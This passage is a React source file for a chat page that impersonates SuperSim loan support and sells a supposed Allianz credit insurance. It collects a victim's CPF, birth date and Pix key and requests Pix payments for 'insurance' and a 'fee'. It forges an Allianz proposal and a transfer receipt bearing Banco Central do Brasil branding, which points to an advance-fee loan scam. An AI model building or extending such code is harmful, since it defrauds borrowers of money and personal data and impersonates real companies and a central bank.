import { useLocation, useNavigate } from "react-router-dom";
import { useState, useEffect, useRef } from "react";
import profileImg from "@/assets/profile-s.png";
import verifiedBadge from "@/assets/verified-badge.webp";
import { ArrowLeft, Send, Check, CheckCheck, Play, Pause, CreditCard, Smartphone, Mail, KeyRound, ShieldCheck, FileDown, Copy, QrCode, Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

interface ChatMessage {
  id: number;
  text?: string;
  audioSrc?: string;
  loanCard?: LoanDetails;
  pixSelector?: boolean;
  pixConfirm?: { type: string; value: string };
  insuranceAudioConfirm?: boolean;
  insuranceCard?: boolean;
  insurancePdf?: string;
  insuranceInfoPdf?: boolean;
  manualConfirmButton?: boolean;
  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number };
  pdfConfirmButton?: boolean;
  proceedButton?: boolean;
  pixPaidButton?: boolean;
  taxaButton?: boolean;
  fromUser: boolean;
  time: string;
  read: boolean;
}

interface LoanDetails {
  valor: number;
  parcelas: number;
  valorParcela: number;
  taxa: number;
  diaPagamento: string;
}

const getNow = () => {
  const d = new Date();
  return d.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
};

const formatCurrency = (v: number) =>
  v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const generateCode = () => {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 10; i++) code += chars[Math.floor(Math.random() * chars.length)];
  return `SEG-${code}`;
};

const AudioPlayer = ({ src }: { src: string }) => {
  const audioRef = useRef<HTMLAudioElement>(null);
  const [playing, setPlaying] = useState(false);
  const [progress, setProgress] = useState(0);
  const [duration, setDuration] = useState(0);

  const toggle = () => {
    if (!audioRef.current) return;
    if (playing) audioRef.current.pause();
    else audioRef.current.play();
    setPlaying(!playing);
  };

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = Math.floor(s % 60);
    return `${m}:${sec.toString().padStart(2, "0")}`;
  };

  return (
    <div className="flex items-center gap-2 min-w-[220px]">
      <audio
        ref={audioRef}
        src={src}
        preload="metadata"
        onLoadedMetadata={() => setDuration(audioRef.current?.duration || 0)}
        onTimeUpdate={() => {
          const a = audioRef.current;
          if (a && a.duration) setProgress((a.currentTime / a.duration) * 100);
        }}
        onEnded={() => { setPlaying(false); setProgress(0); }}
      />
      <div className="w-8 h-8 rounded-full bg-primary flex items-center justify-center shrink-0 cursor-pointer" onClick={toggle}>
        {playing ? <Pause className="w-4 h-4 text-primary-foreground" /> : <Play className="w-4 h-4 text-primary-foreground ml-0.5" />}
      </div>
      <div className="flex-1 flex flex-col gap-1">
        <div className="w-full h-1.5 bg-muted rounded-full overflow-hidden">
          <div className="h-full bg-primary rounded-full transition-all duration-200" style={{ width: `${progress}%` }} />
        </div>
        <span className="text-[10px] text-muted-foreground">
          {duration > 0 ? formatTime(playing ? (audioRef.current?.currentTime || 0) : duration) : "0:00"}
        </span>
      </div>
      <img src={profileImg} alt="" className="w-8 h-8 rounded-full object-contain shrink-0" />
    </div>
  );
};

const LoanConfirmCard = ({ details, onConfirm, confirmed }: { details: LoanDetails; onConfirm: () => void; confirmed: boolean }) => (
  <div className="space-y-3">
    <div className="flex items-center gap-2 mb-2">
      <CreditCard className="w-4 h-4 text-primary" />
      <span className="text-sm font-semibold text-foreground">Modalidade: Crédito Pessoal</span>
    </div>
    <div className="bg-muted/50 rounded-xl p-3 space-y-1.5 text-sm">
      <div className="flex justify-between"><span className="text-muted-foreground">Valor solicitado</span><span className="font-semibold">{formatCurrency(details.valor)}</span></div>
      <div className="flex justify-between"><span className="text-muted-foreground">Parcelas</span><span className="font-semibold">{details.parcelas}x de {formatCurrency(details.valorParcela)}</span></div>
      <div className="flex justify-between"><span className="text-muted-foreground">Taxa mensal</span><span className="font-semibold">{details.taxa}%</span></div>
      <div className="flex justify-between"><span className="text-muted-foreground">Dia de pagamento</span><span className="font-semibold">{details.diaPagamento}</span></div>
    </div>
    {!confirmed ? (
      <button onClick={onConfirm} className="btn-3d w-full !py-2.5 !text-sm !rounded-xl !px-4">
        ✅ Confirmar dados
      </button>
    ) : (
      <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Dados confirmados!</div>
    )}
  </div>
);

const PixSelectorCard = ({ onSelect }: { onSelect: (type: string) => void }) => (
  <div className="space-y-3">
    <p className="text-sm font-semibold text-foreground">Escolha o tipo de chave Pix para recebimento:</p>
    <div className="bg-blue-50 border border-blue-200 rounded-xl p-3 space-y-1.5">
      <div className="flex items-center gap-2">
        <CreditCard className="w-4 h-4 text-blue-600 shrink-0" />
        <span className="text-xs font-semibold text-blue-800">Informação sobre parcelas</span>
      </div>
      <p className="text-[11px] text-blue-700 leading-relaxed">
        O desconto das parcelas será realizado automaticamente na <strong>mesma conta cadastrada</strong> na chave Pix informada abaixo. Certifique-se de que a conta estará ativa e com saldo disponível na data de vencimento.
      </p>
    </div>
    <div className="space-y-2">
      <button onClick={() => onSelect("cpf")} className="w-full flex items-center gap-3 p-3 rounded-xl border border-border hover:bg-primary/5 transition-colors text-left">
        <div className="w-9 h-9 rounded-full bg-primary/10 flex items-center justify-center"><KeyRound className="w-4 h-4 text-primary" /></div>
        <div><p className="text-sm font-semibold text-foreground">CPF</p><p className="text-xs text-muted-foreground">Usar o CPF cadastrado</p></div>
      </button>
      <button onClick={() => onSelect("email")} className="w-full flex items-center gap-3 p-3 rounded-xl border border-border hover:bg-primary/5 transition-colors text-left">
        <div className="w-9 h-9 rounded-full bg-primary/10 flex items-center justify-center"><Mail className="w-4 h-4 text-primary" /></div>
        <div><p className="text-sm font-semibold text-foreground">E-mail</p><p className="text-xs text-muted-foreground">Usar seu e-mail</p></div>
      </button>
      <button onClick={() => onSelect("telefone")} className="w-full flex items-center gap-3 p-3 rounded-xl border border-border hover:bg-primary/5 transition-colors text-left">
        <div className="w-9 h-9 rounded-full bg-primary/10 flex items-center justify-center"><Smartphone className="w-4 h-4 text-primary" /></div>
        <div><p className="text-sm font-semibold text-foreground">Telefone</p><p className="text-xs text-muted-foreground">Usar seu número de celular</p></div>
      </button>
    </div>
  </div>
);

const PixConfirmCard = ({ type, value, onConfirm, onEdit, confirmed }: { type: string; value: string; onConfirm: () => void; onEdit: (newVal: string) => void; confirmed: boolean }) => {
  const [editing, setEditing] = useState(false);
  const [editValue, setEditValue] = useState(value);
  const label = type === "cpf" ? "CPF" : type === "email" ? "E-mail" : "Telefone";

  if (confirmed) {
    return (
      <div className="space-y-2">
        <p className="text-sm text-foreground">Chave Pix ({label}):</p>
        <div className="bg-muted/50 rounded-xl p-3 text-center"><p className="font-semibold text-foreground">{value}</p></div>
        <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Chave confirmada!</div>
      </div>
    );
  }

  return (
    <div className="space-y-3">
      <p className="text-sm text-foreground">Chave Pix ({label}):</p>
      {editing ? (
        <div className="space-y-2">
          <input type="text" value={editValue} onChange={(e) => setEditValue(e.target.value)}
            className="w-full px-3 py-2 rounded-xl border border-border bg-background text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-primary/50" />
          <button onClick={() => { onEdit(editValue); setEditing(false); }}
            className="btn-3d w-full !py-2 !text-sm !rounded-xl !px-4">Salvar</button>
        </div>
      ) : (
        <>
          <div className="bg-muted/50 rounded-xl p-3 text-center"><p className="font-semibold text-foreground">{value}</p></div>
          <div className="flex gap-2">
            <button onClick={onConfirm} className="btn-3d flex-1 !py-2.5 !text-sm !rounded-xl !px-4">✅ Confirmar</button>
            {type !== "cpf" && (
              <button onClick={() => setEditing(true)} className="flex-1 py-2.5 rounded-xl border border-primary text-primary font-bold text-sm hover:bg-primary/5 transition-colors">✏️ Editar</button>
            )}
          </div>
        </>
      )}
    </div>
  );
};

const InsuranceCard = ({ onAccept, onDecline, accepted }: { onAccept: () => void; onDecline: () => void; accepted: boolean | null }) => {
  if (accepted === true) {
    return (
      <div className="space-y-2">
        <div className="flex items-center gap-2"><ShieldCheck className="w-5 h-5 text-green-500" /><span className="text-sm font-semibold text-foreground">Seguro Prestamista</span></div>
        <div className="text-center text-xs text-green-600 font-semibold py-1">✅ Seguro contratado!</div>
      </div>
    );
  }
  if (accepted === false) {
    return (
      <div className="space-y-2">
        <div className="flex items-center gap-2"><ShieldCheck className="w-5 h-5 text-muted-foreground" /><span className="text-sm font-semibold text-foreground">Seguro Prestamista</span></div>
        <div className="text-center text-xs text-muted-foreground font-semibold py-1">Seguro não contratado</div>
      </div>
    );
  }

  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2 mb-1">
        <ShieldCheck className="w-5 h-5 text-primary" />
        <span className="text-sm font-semibold text-foreground">Seguro Prestamista - Allianz</span>
      </div>
      <div className="bg-muted/50 rounded-xl p-3 space-y-2 text-sm">
        <p className="text-muted-foreground text-xs">Proteja seu empréstimo com o Seguro Prestamista. Em caso de imprevistos, suas parcelas ficam cobertas.</p>
        <div className="flex justify-between"><span className="text-muted-foreground">Coberturas</span><span className="font-semibold text-xs">Morte, IPA, IFPD</span></div>
        <div className="flex justify-between"><span className="text-muted-foreground">Valor mensal</span><span className="font-semibold text-primary text-base">R$ 34,90</span></div>
        <div className="flex justify-between"><span className="text-muted-foreground">Seguradora</span><span className="font-semibold">Allianz Seguros</span></div>
        <div className="flex justify-between"><span className="text-muted-foreground">SUSEP</span><span className="font-semibold text-xs">15414.901719/2014-89</span></div>
      </div>
      <div className="flex gap-2">
        <button onClick={onAccept} className="btn-3d flex-1 !py-2.5 !text-sm !rounded-xl !px-4 !bg-green-600 !border-b-green-800">
          ✅ Aderir ao seguro
        </button>
        <button onClick={onDecline} className="flex-1 py-2.5 rounded-xl border border-border text-muted-foreground font-bold text-sm hover:bg-muted/50 transition-colors">
          Não, obrigado
        </button>
      </div>
    </div>
  );
};

const InsurancePdfCard = ({ pdfUrl }: { pdfUrl: string }) => (
  <div className="space-y-2">
    <div className="flex items-center gap-2">
      <FileDown className="w-5 h-5 text-primary" />
      <span className="text-sm font-semibold text-foreground">Proposta de Adesão - Seguro Prestamista</span>
    </div>
    <img src={pdfUrl} alt="Proposta de Adesão" className="w-full rounded-lg border border-border" />
  </div>
);


const InsuranceInfoPdfCard = () => (
  <div className="space-y-2">
    <div className="flex items-center gap-2">
      <ShieldCheck className="w-5 h-5 text-primary" />
      <span className="text-sm font-semibold text-foreground">Manual do Seguro Prestamista</span>
    </div>
    <p className="text-xs text-muted-foreground">Acesse o manual completo do seu seguro para entender todas as coberturas, como acionar e utilizar:</p>
    <a
      href="/docs/seguro-prestamista.pdf"
      target="_blank"
      rel="noopener noreferrer"
      className="btn-3d flex items-center gap-2 !py-2.5 !px-4 !rounded-xl !text-sm justify-center"
    >
      <FileDown className="w-4 h-4" />
      📖 Abrir Manual do Seguro
    </a>
  </div>
);

const PixPaymentCard = ({ qrCode, qrCodeBase64, value }: { qrCode: string; qrCodeBase64: string; value: number }) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(qrCode).then(() => {
      setCopied(true);
      toast.success("Código PIX copiado!");
      setTimeout(() => setCopied(false), 3000);
    });
  };

  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2 mb-1">
        <QrCode className="w-5 h-5 text-primary" />
        <span className="text-sm font-semibold text-foreground">Seguro Prestamista - Allianz</span>
      </div>
      <div className="bg-muted/50 rounded-xl p-3 space-y-2 text-center">
        <p className="text-xs text-muted-foreground">Valor do Seguro Prestamista:</p>
        <p className="text-2xl font-bold text-primary">{formatCurrency(value / 100)}</p>
      </div>
      {qrCodeBase64 && (
        <div className="flex justify-center">
          <img
            src={qrCodeBase64}
            alt="QR Code PIX"
            className="w-48 h-48 rounded-lg border border-border"
          />
        </div>
      )}
      <div className="space-y-2">
        <p className="text-xs text-muted-foreground text-center">Ou copie o código abaixo:</p>
        <div className="bg-muted/50 rounded-xl p-3 break-all text-xs text-foreground font-mono max-h-20 overflow-y-auto">
          {qrCode}
        </div>
        <button
          onClick={handleCopy}
          className={`btn-3d w-full !py-2.5 !rounded-xl !text-sm flex items-center justify-center gap-2 ${
            copied
              ? "!bg-green-600 !border-b-green-800"
              : ""
          }`}
        >
          {copied ? (
            <><Check className="w-4 h-4" /> Copiado!</>
          ) : (
            <><Copy className="w-4 h-4" /> Copiar código PIX</>
          )}
        </button>
      </div>
      <p className="text-[10px] text-muted-foreground text-center">
        O QR Code tem validade limitada. Efetue o pagamento o mais rápido possível.
      </p>
    </div>
  );
};

// Transfer receipt generator
const generateTransferReceipt = async (data: { nome: string; cpf: string; valor: number; protocolo: string }) => {
  const canvas = document.createElement("canvas");
  const scale = 2;
  const w = 400;
  const h = 520;
  canvas.width = w * scale;
  canvas.height = h * scale;
  const ctx = canvas.getContext("2d")!;
  ctx.scale(scale, scale);

  // Background
  ctx.fillStyle = "#ffffff";
  ctx.fillRect(0, 0, w, h);

  // Top green bar
  ctx.fillStyle = "#00875A";
  ctx.fillRect(0, 0, w, 80);

  // Check icon circle
  ctx.fillStyle = "#ffffff";
  ctx.beginPath();
  ctx.arc(w / 2, 50, 22, 0, Math.PI * 2);
  ctx.fill();
  ctx.fillStyle = "#00875A";
  ctx.font = "bold 24px Arial";
  ctx.textAlign = "center";
  ctx.fillText("✓", w / 2, 58);

  // Title
  ctx.fillStyle = "#ffffff";
  ctx.font = "bold 14px Arial";
  ctx.fillText("Transferência Realizada", w / 2, 28);

  let y = 100;
  ctx.textAlign = "left";

  // Separator helper
  const drawSep = () => {
    ctx.strokeStyle = "#e5e5e5";
    ctx.beginPath();
    ctx.moveTo(20, y);
    ctx.lineTo(w - 20, y);
    ctx.stroke();
    y += 12;
  };

  // Field helper
  const drawReceiptField = (label: string, value: string) => {
    ctx.fillStyle = "#888888";
    ctx.font = "11px Arial";
    ctx.fillText(label, 25, y);
    y += 16;
    ctx.fillStyle = "#222222";
    ctx.font = "bold 12px Arial";
    ctx.fillText(value, 25, y);
    y += 22;
  };

  // Value highlight
  ctx.fillStyle = "#f8f9fa";
  ctx.fillRect(20, y, w - 40, 50);
  ctx.fillStyle = "#888888";
  ctx.font = "11px Arial";
  ctx.fillText("Valor da transferência", 30, y + 18);
  ctx.fillStyle = "#00875A";
  ctx.font = "bold 22px Arial";
  ctx.fillText(formatCurrency(data.valor), 30, y + 42);
  y += 65;

  drawSep();
  drawReceiptField("Data e hora", new Date().toLocaleString("pt-BR"));
  drawSep();
  drawReceiptField("Tipo", "Pix");
  drawSep();

  // Origin
  ctx.fillStyle = "#003366";
  ctx.font = "bold 11px Arial";
  ctx.fillText("ORIGEM", 25, y);
  y += 18;
  drawReceiptField("Instituição", "SuperSim Serviços Financeiros LTDA");
  drawReceiptField("CNPJ", "38.093.940/0001-87");
  drawSep();

  // Destination
  ctx.fillStyle = "#003366";
  ctx.font = "bold 11px Arial";
  ctx.fillText("DESTINO", 25, y);
  y += 18;
  drawReceiptField("Nome", data.nome);
  drawReceiptField("CPF", data.cpf);
  drawSep();

  // Protocol
  drawReceiptField("Protocolo", data.protocolo);

  // Footer
  ctx.fillStyle = "#f0f0f0";
  ctx.fillRect(0, h - 35, w, 35);
  ctx.fillStyle = "#999999";
  ctx.font = "9px Arial";
  ctx.textAlign = "center";
  ctx.fillText("Banco Central do Brasil - Comprovante de Transação PIX", w / 2, h - 18);
  ctx.fillText(`Autenticação: ${data.protocolo}`, w / 2, h - 8);

  return new Promise<string>((resolve) => {
    canvas.toBlob((blob) => {
      if (blob) resolve(URL.createObjectURL(blob));
    }, "image/png");
  });
};

const TransferReceiptCard = ({ nome, cpf, valor, protocolo }: { nome: string; cpf: string; valor: number; protocolo: string }) => {
  const [receiptUrl, setReceiptUrl] = useState<string | null>(null);

  useEffect(() => {
    generateTransferReceipt({ nome, cpf, valor, protocolo }).then(setReceiptUrl);
  }, [nome, cpf, valor, protocolo]);

  if (!receiptUrl) return (
    <div className="text-center py-4">
      <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto" />
      <p className="text-xs text-muted-foreground mt-1">Gerando comprovante...</p>
    </div>
  );

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2">
        <ShieldCheck className="w-5 h-5 text-green-600" />
        <span className="text-sm font-semibold text-green-700">Comprovante de Transferência</span>
      </div>
      <img src={receiptUrl} alt="Comprovante de Transferência" className="w-full rounded-lg border border-border shadow-sm" />
    </div>
  );
};

const PixPaymentLoading = () => (
  <div className="space-y-3 text-center py-4">
    <Loader2 className="w-8 h-8 text-primary animate-spin mx-auto" />
    <p className="text-sm text-muted-foreground">Gerando código PIX...</p>
  </div>
);

// Generate PDF in-browser using canvas
const generateInsurancePdf = async (data: {
  nome: string; cpf: string; dataNascimento: string; codigo: string;
  valor: number; parcelas: number; valorParcela: number;
}) => {
  const canvas = document.createElement("canvas");
  const scale = 2;
  const pw = 595;
  const ph = 842;
  canvas.width = pw * scale;
  canvas.height = ph * scale;
  const ctx = canvas.getContext("2d")!;
  ctx.scale(scale, scale);

  // Background
  ctx.fillStyle = "#ffffff";
  ctx.fillRect(0, 0, pw, ph);

  // Header - white background with text
  ctx.fillStyle = "#333333";
  ctx.font = "12px Arial";
  ctx.fillText("Proposta de Adesão", 25, 30);
  ctx.fillStyle = "#003366";
  ctx.font = "bold 26px Arial";
  ctx.fillText("Prestamista", 25, 62);

  // Draw Allianz logo with preserved aspect ratio
  const logoImg = new Image();
  logoImg.crossOrigin = "anonymous";
  logoImg.src = "/images/allianz-logo.png";
  await new Promise<void>((res) => { logoImg.onload = () => res(); logoImg.onerror = () => res(); });
  if (logoImg.complete && logoImg.naturalWidth > 0 && logoImg.naturalHeight > 0) {
    const maxLogoWidth = 170;
    const maxLogoHeight = 44;
    const logoRatio = logoImg.naturalWidth / logoImg.naturalHeight;
    let logoWidth = maxLogoWidth;
    let logoHeight = logoWidth / logoRatio;

    if (logoHeight > maxLogoHeight) {
      logoHeight = maxLogoHeight;
      logoWidth = logoHeight * logoRatio;
    }

    ctx.drawImage(logoImg, pw - 25 - logoWidth, 14, logoWidth, logoHeight);
  } else {
    ctx.fillStyle = "#003366";
    ctx.font = "bold 16px Arial";
    ctx.fillText("Allianz", 460, 45);
  }

  // Helper
  let y = 85;
  const drawSection = (title: string) => {
    ctx.fillStyle = "#003366";
    ctx.fillRect(20, y, 555, 22);
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 10px Arial";
    ctx.fillText(title, 25, y + 15);
    y += 30;
  };

  const drawField = (label: string, value: string, x: number, fieldWidth: number) => {
    ctx.fillStyle = "#003366";
    ctx.font = "9px Arial";
    ctx.fillText(label, x, y);
    ctx.fillStyle = "#000000";
    ctx.font = "bold 11px Arial";
    ctx.fillText(value, x, y + 14);
    ctx.strokeStyle = "#cccccc";
    ctx.beginPath();
    ctx.moveTo(x, y + 18);
    ctx.lineTo(x + fieldWidth, y + 18);
    ctx.stroke();
  };

  const drawFieldRow = (fields: { label: string; value: string; width: number }[]) => {
    let x = 25;
    for (const f of fields) {
      drawField(f.label, f.value, x, f.width);
      x += f.width + 15;
    }
    y += 32;
  };

  // Dados do Estipulante
  drawSection("DADOS DO ESTIPULANTE");
  drawFieldRow([{ label: "Estipulante", value: "SuperSim Serviços Financeiros LTDA", width: 350 }, { label: "Nº Apólice", value: data.codigo, width: 170 }]);

  // Dados do Proponente
  drawSection("DADOS DO PROPONENTE");
  drawFieldRow([{ label: "Nome Completo", value: data.nome, width: 530 }]);
  drawFieldRow([{ label: "CPF", value: data.cpf, width: 200 }, { label: "Data de Nascimento", value: data.dataNascimento, width: 150 }, { label: "Data", value: new Date().toLocaleDateString("pt-BR"), width: 120 }]);

  // Plano de Seguro
  drawSection("PLANO DE SEGURO");
  drawFieldRow([{ label: "Plano de Financiamento/Prestação", value: `${data.parcelas}x de ${formatCurrency(data.valorParcela)}`, width: 300 }, { label: "Início de Vigência", value: new Date().toLocaleDateString("pt-BR"), width: 200 }]);

  const coberturas = [
    { nome: "Morte", valor: formatCurrency(data.valor) },
    { nome: "IPA - Invalidez Permanente Total por Acidente", valor: formatCurrency(data.valor) },
    { nome: "IFPD - Invalidez Funcional Permanente Total por Doença", valor: formatCurrency(data.valor) },
    { nome: "PR - Perda de Renda", valor: formatCurrency(data.valor) },
  ];

  ctx.fillStyle = "#f5f5f5";
  ctx.fillRect(25, y, 545, 22);
  ctx.fillStyle = "#003366";
  ctx.font = "bold 9px Arial";
  ctx.fillText("Coberturas", 30, y + 15);
  ctx.fillText("Capital Segurado - R$", 400, y + 15);
  y += 28;

  for (const c of coberturas) {
    ctx.fillStyle = "#333333";
    ctx.font = "9px Arial";
    ctx.fillText(c.nome, 30, y);
    ctx.fillText(c.valor, 400, y);
    ctx.strokeStyle = "#e0e0e0";
    ctx.beginPath();
    ctx.moveTo(25, y + 6);
    ctx.lineTo(570, y + 6);
    ctx.stroke();
    y += 18;
  }
  y += 5;

  ctx.fillStyle = "#003366";
  ctx.font = "bold 10px Arial";
  ctx.fillText(`Prêmio do Seguro Mensal: R$ 34,90`, 25, y);
  y += 25;

  // Termos
  ctx.fillStyle = "#f0f0f0";
  ctx.fillRect(20, y, 555, 60);
  ctx.fillStyle = "#333333";
  ctx.font = "7px Arial";
  const termos = "Autorizo a referida inclusão, no seguro Allianz Prestamista, conforme as Condições Gerais e Especiais em poder do Estipulante, o quem concedo o direito de agir em meu nome no suprimento de todas as cláusulas contempladas neste seguro. Declaro todas as comunicações serão através da internet, com anuência e meu consentimento.";
  const termoLines = wrapText(ctx, termos, 540);
  let ty = y + 10;
  for (const line of termoLines) {
    ctx.fillText(line, 28, ty);
    ty += 10;
  }
  y += 70;

  // Assinatura
  ctx.strokeStyle = "#333333";
  ctx.beginPath();
  ctx.moveTo(25, y);
  ctx.lineTo(280, y);
  ctx.stroke();
  ctx.fillStyle = "#666666";
  ctx.font = "8px Arial";
  ctx.fillText("Assinatura do Proponente", 100, y + 12);

  ctx.beginPath();
  ctx.moveTo(320, y);
  ctx.lineTo(570, y);
  ctx.stroke();
  ctx.fillText("Data: " + new Date().toLocaleDateString("pt-BR"), 400, y + 12);

  y += 35;

  // Footer
  ctx.fillStyle = "#003366";
  ctx.fillRect(0, 810, 595, 32);
  ctx.fillStyle = "#ffffff";
  ctx.font = "7px Arial";
  ctx.fillText("Allianz Seguros S.A. - CNPJ 61.573.796/0001-66 - Pág. 1 Processo SUSEP nº 15414.901719/2014-89", 100, 825);
  ctx.fillText(`Código: ${data.codigo}`, 25, 825);

  // Convert to blob
  return new Promise<string>((resolve) => {
    canvas.toBlob((blob) => {
      if (blob) {
        const url = URL.createObjectURL(blob);
        resolve(url);
      }
    }, "image/png");
  });
};

function wrapText(ctx: CanvasRenderingContext2D, text: string, maxWidth: number): string[] {
  const words = text.split(" ");
  const lines: string[] = [];
  let current = "";
  for (const word of words) {
    const test = current ? current + " " + word : word;
    if (ctx.measureText(test).width > maxWidth) {
      if (current) lines.push(current);
      current = word;
    } else {
      current = test;
    }
  }
  if (current) lines.push(current);
  return lines;
}

const TypingIndicator = () => (
  <div className="flex justify-start">
    <div className="max-w-[85%] rounded-2xl px-4 py-3 shadow-sm bg-white rounded-tl-sm">
      <div className="flex items-center gap-1">
        <span className="text-xs text-muted-foreground italic">digitando</span>
        <div className="flex gap-0.5 ml-1">
          <span className="w-1.5 h-1.5 bg-muted-foreground/60 rounded-full animate-bounce" style={{ animationDelay: "0ms" }} />
          <span className="w-1.5 h-1.5 bg-muted-foreground/60 rounded-full animate-bounce" style={{ animationDelay: "150ms" }} />
          <span className="w-1.5 h-1.5 bg-muted-foreground/60 rounded-full animate-bounce" style={{ animationDelay: "300ms" }} />
        </div>
      </div>
    </div>
  </div>
);

const Chat = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { initialMessage, nome, cpf, email, celular, dataNascimento, loanDetails } = (location.state as any) || {};
  const firstName = nome ? nome.split(" ")[0] : "";
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState("");
  const [loanConfirmed, setLoanConfirmed] = useState(false);
  const [pixStep, setPixStep] = useState<"none" | "selecting" | "confirming" | "done">("none");
  const [pixType, setPixType] = useState("");
  const [pixValue, setPixValue] = useState("");
  const [pixConfirmed, setPixConfirmed] = useState(false);
  const [insuranceAccepted, setInsuranceAccepted] = useState<boolean | null>(null);
  const [insuranceShown, setInsuranceShown] = useState(false);
  const [insuranceAudioConfirmed, setInsuranceAudioConfirmed] = useState(false);
  const [pdfConfirmed, setPdfConfirmed] = useState(false);
  const [manualConfirmed, setManualConfirmed] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [greetingSent, setGreetingSent] = useState(false);
  const [proceeded, setProceeded] = useState(false);
  const [taxaConfirmed, setTaxaConfirmed] = useState(false);
  const [pixPaid, setPixPaid] = useState(false);
  const [taxaPaid, setTaxaPaid] = useState(false);
  const [paymentPhase, setPaymentPhase] = useState<"insurance" | "taxa">("insurance");
  const [pixTransactionId, setPixTransactionId] = useState<string | null>(null);
  const [checkingPayment, setCheckingPayment] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);
  const typingQueue = useRef<(() => void)[]>([]);
  const processingQueue = useRef(false);

  // Helper: show typing for 3s then add bot message(s)
  const addBotMessages = (msgsFn: () => ChatMessage[], delayAfterTyping = 0) => {
    return new Promise<void>((resolve) => {
      typingQueue.current.push(() => {
        setIsTyping(true);
        setTimeout(() => {
          setIsTyping(false);
          setTimeout(() => {
            setMessages((prev) => [...prev, ...msgsFn()]);
            resolve();
            processingQueue.current = false;
            processNextInQueue();
          }, delayAfterTyping);
        }, 3000);
      });
      processNextInQueue();
    });
  };

  const processNextInQueue = () => {
    if (processingQueue.current || typingQueue.current.length === 0) return;
    processingQueue.current = true;
    const next = typingQueue.current.shift();
    next?.();
  };

  // Greeting is NOT auto-sent — user must tap it
  const greetingText = `Olá${firstName ? `, ${firstName}` : ""}! Seja bem-vindo(a) ao atendimento SuperSim. Estamos aqui para te ajudar com o seu empréstimo.`;

  const handleSendGreeting = () => {
    if (greetingSent) return;
    setGreetingSent(true);

    // User sends the initial message
    setMessages((prev) => [...prev, { id: Date.now(), text: initialMessage || "Olá, gostaria de solicitar meu empréstimo!", fromUser: true, time: getNow(), read: true }]);

    // Bot replies with greeting after typing indicator
    addBotMessages(() => [{
      id: Date.now() + 1, text: greetingText,
      fromUser: false, time: getNow(), read: true,
    }]).then(() => {
      // Then audio
      addBotMessages(() => [{
        id: Date.now() + 2, audioSrc: "/audio/welcome.mp3", fromUser: false, time: getNow(), read: true,
      }]).then(() => {
        // Show proceed button
        addBotMessages(() => [{
          id: Date.now() + 3, proceedButton: true, fromUser: false, time: getNow(), read: true,
        }]);
      });
    });
  };

  const handleProceed = () => {
    if (proceeded) return;
    setProceeded(true);
    setMessages((prev) => [...prev, { id: Date.now(), text: "Prosseguir ▶️", fromUser: true, time: getNow(), read: true }]);
    if (loanDetails) {
      setTimeout(() => {
        addBotMessages(() => [
          { id: Date.now() + 1, text: `Perfeito, ${firstName || "cliente"}! Aqui estão os detalhes da modalidade de crédito que você escolheu. Por favor, confira e confirme:`, fromUser: false, time: getNow(), read: true },
          { id: Date.now() + 2, loanCard: loanDetails, fromUser: false, time: getNow(), read: true },
        ]);
      }, 500);
    }
  };

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, isTyping]);

  const handleLoanConfirm = () => {
    setLoanConfirmed(true);
    setPixStep("selecting");
    setTimeout(() => {
      setMessages((prev) => [...prev, { id: Date.now(), text: "Dados corretos!", fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      addBotMessages(() => [
        { id: Date.now() + 1, text: `Ótimo, ${firstName || "cliente"}! Agora precisamos da sua chave Pix para o recebimento do valor. Escolha o tipo:`, fromUser: false, time: getNow(), read: true },
        { id: Date.now() + 2, pixSelector: true, fromUser: false, time: getNow(), read: true },
      ]);
    }, 500);
  };

  const handlePixSelect = (type: string) => {
    setPixType(type);
    setPixStep("confirming");
    let value = "";
    if (type === "cpf") value = cpf || "000.000.000-00";
    else if (type === "email") value = email || "";
    else if (type === "telefone") value = celular || "";
    setPixValue(value);

    const label = type === "cpf" ? "CPF" : type === "email" ? "E-mail" : "Telefone";
    setTimeout(() => {
      setMessages((prev) => [...prev, { id: Date.now(), text: `Chave Pix: ${label}`, fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      addBotMessages(() => [
        { id: Date.now() + 1, text: `Confira sua chave Pix (${label}) abaixo${type === "cpf" ? ". Como é CPF, já puxamos automaticamente!" : " e edite se necessário:"}`, fromUser: false, time: getNow(), read: true },
        { id: Date.now() + 2, pixConfirm: { type, value }, fromUser: false, time: getNow(), read: true },
      ]);
    }, 500);
  };

  const handlePixConfirm = () => {
    setPixConfirmed(true);
    setPixStep("done");
    setTimeout(() => {
      setMessages((prev) => [...prev, { id: Date.now(), text: `Chave Pix confirmada: ${pixValue}`, fromUser: true, time: getNow(), read: true }]);
    }, 300);
    setTimeout(() => {
      addBotMessages(() => [
        { id: Date.now() + 3, text: `${firstName || "Cliente"}, para proteger seu empréstimo, incluímos o Seguro Prestamista Allianz por apenas R$ 34,90/mês.`, fromUser: false, time: getNow(), read: true },
      ]).then(() => {
        addBotMessages(() => [
          { id: Date.now() + 4, audioSrc: "/audio/seguro-confirmado-v2.mp3", fromUser: false, time: getNow(), read: true },
        ]).then(() => {
          addBotMessages(() => [
            { id: Date.now() + 5, insuranceAudioConfirm: true, fromUser: false, time: getNow(), read: true },
          ]);
        });
      });
    }, 500);
  };

  const handleInsuranceAudioConfirm = () => {
    setInsuranceAudioConfirmed(true);
    setTimeout(() => {
